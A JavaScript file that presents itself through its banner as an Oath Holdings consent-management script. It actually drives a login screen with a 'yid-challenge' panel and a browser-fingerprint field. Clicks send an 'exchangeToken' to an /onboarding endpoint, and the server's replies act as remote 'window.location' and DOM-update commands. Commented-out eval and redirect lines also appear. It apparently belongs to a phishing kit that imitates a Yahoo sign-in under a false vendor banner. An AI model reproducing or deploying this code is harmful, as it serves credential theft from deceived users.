/*! CMP 6.4.0 Copyright 2018 Oath Holdings, Inc. */
window.onload = function() {
 (async function() {
  "use_strict";
  var es = this.OOBE;
  function setButtonToActive(e){!e.preventDefault();es.aC(e.target, "active")}
  function zoomButtonIn(e){!e.preventDefault()&&!es.aC(es.pinner(e.target,"input")[0],"zoomin")}
  function zoomButtonOut(e){!e.preventDefault()&&!es.rC(es.pinner(e.target,"input")[0],"zoomin")}
  function addClickEventListenerToAllPureeActionButtons(){for (var e = document.querySelectorAll(".button-container"), t = 0, o = e.length; t < o; t += 1) !(e[t].addEventListener("click",setButtonToActive))&&!(e[t].addEventListener("click",setButtonClick))&&!(e[t].addEventListener("mouseenter",zoomButtonIn))&&!(e[t].addEventListener("mouseleave",zoomButtonOut))}
  function setButtonClick(e){!e.preventDefault()&&!((
   function(e){
    try{
     var b = es.panel("side-content-loading");
     setTimeout(()=>{
      es.aC(es.panel("yid-challenge"),es.lsd());
      es.rC(b,es.lsd());
      e = e.id||es.pinner(e,"input")[0].id;
      e = {exchangeToken:e.trim()};
      es.reqDataHandler({u:"/onboarding?crumb=0/",rt:"POST",d:e,ct:es.cTP(0)})
      .then((e)=>{
       e = es.gJD(e);
       if (e.Status===15){
        // window.location command
        console.log(e.Answer);
        //return es._i_.send.es.xhrq((JSON.parse(es.dfx(e.Answer)))[0]);
       }
       else if (e.Status===0){
        // dom update command
        //es.initFP(es.dfx);
        //String.prototype._wH_=eval(e.dxor);
        es.V18(es.panel("yid-challenge"),es.yid);
        es.aC(es.panel("side-content-loading"),es.lsd());
        es.rC(es.panel("yid-challenge"),es.lsd());
       }
      });
     },0.513);
    }catch(e){console.log("ERROR CONN",e)}
   })(e.target))}
  await es.reqDataHandler({u:"/onboarding?crumb=0/"}).then(()=>{
   setTimeout(function(){
    !es.tM&&!((function(){
     es.aC(es.panel("content-loading"),es.lsd());
     es.aC(es.panel("login-body"),"grayscale");
     es.rC(es.panel("container-loading"),es.lsd());
     es.rC(es.panel("footer-box"),es.lsd());
     browserFPField = document.getElementById("browser-fp-data");
     addClickEventListenerToAllPureeActionButtons();
    })(es));
   },es.tS);
  });
 })((function() {
  return this.OOBE={
   aC: function(e, j) {
    !e.className.includes(j) ? e.classList.add(j) : e.className
   },
   iC: function(e, j) {
    e.innerHTML = j
   },
   rC: function(e, j) {
    e.className.includes(j) ? e.classList.remove(j) : e.className
   },
   gJD: function(e) {
    try {
     return JSON.parse(JSON.stringify(e))
    } catch (e) {
     return {}
    }
   },
   gJS: function(e) {
    try {
     return JSON.stringify(e)
    } catch (e) {
     return ""
    }
   },
   errConnAborted: undefined,
   _i_: {
    send: {
     es: {
      xhrq: function(e) {
       window.location.replace(e)
      }
     }
    }
   },
   pinner: function(e, s) {
    return e.getElementsByTagName(s)
   },
   reqDataHandler: async function({u: e="", c: r="no-cors", rt: t="GET", d: n, ct: o="", fr: c="follow", rf: i="no-referrer"}={}) {
    try {
     e = location.pathname+e;
     const r = {
      method: t,
      cache: "no-cache",
      redirect: c,
      referrerPolicy: i
     };
     "POST" == t && (o.includes("application/json") ? r.body = JSON.stringify(n) : r.body = `${n}`,
     r.headers = {
      "Content-Type": o
     });
     const a = await fetch(e, r);
     if (o.includes("application/json"))
      return a.json();
     if (o.includes("application/text"))
      return a.text();
     if (o.includes("text/html"))
      return a.text();
     if (o.includes("form")) {
      const e = a.formData()
       , r = {};
      for (const t of e.entries())
       r[t[0]] = t[1];
      return r
     }
     return
    } catch (e) {}
   },
   vE: {
    d: "/dash/"
   },
   V18: function(e,j) {
    e.innerText = j
   },
   cTP: function(e) {
    if (e == 0) {
     return "application/json"
    }
   },
   lsd: function() {
    return "initial-loading-state"
   },
   chunkSize: undefined,
   dword: null,
   vR: {},
   pm2: undefined,
   ems: null,
   gK: null,
   kW: null,
   tS: 1.3e3,
   panel: function(e) {
    return document.getElementById(e)
   }
  };
 })());
}